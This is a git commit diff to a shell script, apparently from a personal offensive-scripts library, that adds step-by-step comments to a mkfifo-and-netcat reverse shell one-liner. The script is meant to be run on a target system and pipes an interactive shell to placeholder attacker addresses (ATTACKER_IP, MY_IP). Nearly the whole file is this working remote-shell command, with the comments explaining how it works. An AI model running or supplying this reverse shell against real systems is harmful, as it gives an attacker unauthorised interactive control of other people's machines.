0de402518963c6c8d50b072fbe6e01fe7bc245c4
TheMythicalGryphon - Pheonix <ConSilverstone@users.noreply.github.com>
2025-06-22 18:57:36 +0100

    Added explanation to pipedshell.sh

--- ScriptLibrary/BasicShellScripts/pipedshell.sh
+++ ScriptLibrary/BasicShellScripts/pipedshell.sh
@@ -1,4 +1,12 @@
 #! /bin/bash
 # Simple pipe reverse shell syntax to be used on target system in order to establish connection
+# rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+# Change MY_IP MY_PORT as needed.
 
-rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+# Remove any existing pipe called f under /tmp to avoid conflicts
+rm -f /tmp/f
+# Make a new pipe  (First In First Out) called f
+mkfifo /tmp/f
+# Read the input of the pipe and push it to shell instance (sh -i or can use bash -i 2>&1)
+# Then push the output result of that runned command from shell instance to a netcat tunnel to the attacker.
+cat /tmp/f | sh -i 2>&1 | nc MY_IP MY_PORT >/tmp/f
